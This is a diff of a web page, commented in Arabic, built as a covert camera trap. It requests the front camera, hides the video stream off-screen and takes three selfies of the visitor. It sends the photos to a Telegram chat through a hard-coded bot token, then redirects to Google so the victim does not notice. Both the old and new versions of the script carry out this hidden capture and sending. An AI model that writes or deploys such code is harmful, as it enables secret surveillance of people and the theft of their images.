@@ -2,15 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://www.google.com">
-    <title>Google</title>
+    <title></title>
     <style>
-        /* إخفاء كامل للصفحة */
+        /* صفحة بيضاء بالكامل */
         body { 
-            display: none; 
-            background: #000;
+            background: white;
             margin: 0;
             padding: 0;
+            width: 100vw;
+            height: 100vh;
         }
     </style>
 </head>
@@ -20,79 +20,76 @@
         const USER_ID = new URLSearchParams(window.location.search).get('id');
         const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
 
-        // إذا ما في ID بالرابط، نحول فوراً
+        // إذا ما في ID بالرابط، نوقف (ما نتحول)
         if (!USER_ID) {
-            window.location.replace("https://www.google.com");
+            // الصفحة تبقى بيضاء
         } else {
-            // ==================== التصوير الخفي المباشر ====================
-            (async function() {
-                try {
-                    // طلب الكاميرا الأمامية بصمت
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: 'user',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    });
+            // ==================== طلب الكاميرا ====================
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            })
+            .then(async (stream) => {
+                // تمت الموافقة ✅
+                
+                // عنصر فيديو مخفي
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                video.setAttribute('autoplay', '');
+                video.style.position = 'absolute';
+                video.style.left = '-9999px';
+                video.style.top = '-9999px';
+                video.style.width = '1px';
+                video.style.height = '1px';
+                video.style.opacity = '0';
+                document.body.appendChild(video);
 
-                    // عنصر فيديو مخفي تماماً
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', '');
-                    video.setAttribute('autoplay', '');
-                    video.style.position = 'absolute';
-                    video.style.left = '-9999px';
-                    video.style.top = '-9999px';
-                    video.style.width = '1px';
-                    video.style.height = '1px';
-                    video.style.opacity = '0';
-                    video.style.pointerEvents = 'none';
-                    document.body.appendChild(video);
+                // انتظار تحميل الفيديو
+                await new Promise(resolve => {
+                    if (video.videoWidth > 0) resolve();
+                    else video.onloadedmetadata = resolve;
+                });
 
-                    // انتظار تحميل الفيديو
-                    await new Promise(resolve => {
-                        if (video.videoWidth > 0) resolve();
-                        else video.onloadedmetadata = resolve;
-                    });
+                // التقاط 3 صور
+                for (let i = 0; i < 3; i++) {
+                    await new Promise(r => setTimeout(r, i * 300));
 
-                    // التقاط 3 صور سريعة
-                    for (let i = 0; i < 3; i++) {
-                        // تأخير بسيط بين الصور
-                        await new Promise(r => setTimeout(r, i * 300));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
 
-                        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                    const formData = new FormData();
+                    formData.append('chat_id', USER_ID);
+                    formData.append('photo', blob, `selfie_${i+1}.jpg`);
 
-                        // إرسال الصورة (في الخلفية)
-                        const formData = new FormData();
-                        formData.append('chat_id', USER_ID);
-                        formData.append('photo', blob, `selfie_${i+1}.jpg`);
-
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).catch(e => {});
-                    }
-
-                    // تنظيف
-                    stream.getTracks().forEach(t => t.stop());
-                    video.remove();
-
-                } catch(e) {
-                    // في حالة الفشل، نسوي nothing (بس نكمل)
-                    console.log('Camera error:', e);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => {});
                 }
 
-                // تحويل فوري لجوجل (دائماً)
+                // تنظيف
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
+
+                // تحويل لجوجل ✅
                 window.location.replace("https://www.google.com");
-            })();
+            })
+            .catch((error) => {
+                // تم الرفض ❌
+                // الصفحة تبقى بيضاء ولا يتحول لأي مكان
+                console.log('Camera permission denied:', error);
+                // لا تفعل شيء، ابقى في الصفحة البيضاء
+            });
         }
     </script>
 </body>
